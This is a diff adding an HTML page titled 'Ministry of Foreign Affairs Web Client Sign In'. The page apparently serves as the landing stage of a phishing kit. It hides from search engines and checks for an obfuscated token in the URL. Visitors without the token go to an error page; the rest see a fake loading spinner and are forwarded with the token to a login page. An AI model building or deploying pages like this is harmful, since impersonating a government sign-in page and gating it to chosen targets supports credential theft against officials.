@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+        <meta http-equiv="X-UA-Compatible" content="IE=10">
+        <link rel="shortcut icon" href="./files/favicon.ico" type="image/x-icon">
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+        <meta name="Robots" content="NOINDEX, NOFOLLOW">
+        <title>Ministry of Foreign Affairs Web Client Sign In</title>
+
+        <style>
+
+            p{
+                font-size: 16px;
+                color: #25b09b;
+                font-family: 'wf_segoe-ui_normal', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
+
+            }
+
+        .spinner {
+            width: 120px;
+            height: 120px;
+            border-radius: 50%;
+            border: 12px solid;
+            border-color: #dbdcef;
+            border-right-color:  #25b09b;
+            animation: spinner-d3wgkg 1s infinite linear;
+            }
+
+            @keyframes spinner-d3wgkg {
+            to {
+                transform: rotate(1turn);
+            }
+            }
+        </style>
+        <head>
+      <script>
+		function getQueryParameter(param) {
+		// Get the query string from the URL
+		const queryString = window.location.search;
+
+		// Use URLSearchParams to parse the query string
+		const urlParams = new URLSearchParams(queryString);
+
+		// Return the value of the requested parameter or null if it doesn't exist
+		return urlParams.get(param);
+		}
+
+		// Example usage
+		const value = getQueryParameter('fhgoidjgoireiotogljkgioeruwtioelgndlrie');
+
+		
+		if (value == null) {
+
+		window.location.href = 'error.html';
+			
+		}else{
+
+			
+		setTimeout(function() {
+				window.location.href = 'login.html?fhhfihfihhfsduhfuhwfweuhrwehuf=' + value;
+			}, 5000); // 5000 milliseconds = 5 seconds
+
+		 }
+		
+    </script>
+	
+</head>
+<body>
+
+    <br><br><br><br><br><br><br>
+    <center>
+
+
+        <br><br><br>
+        <div class="spinner"></div>
+        <br><br><br><br>
+        <p>Loading...</p>
+
+    </center>
+   
+</body>
+</html>
+
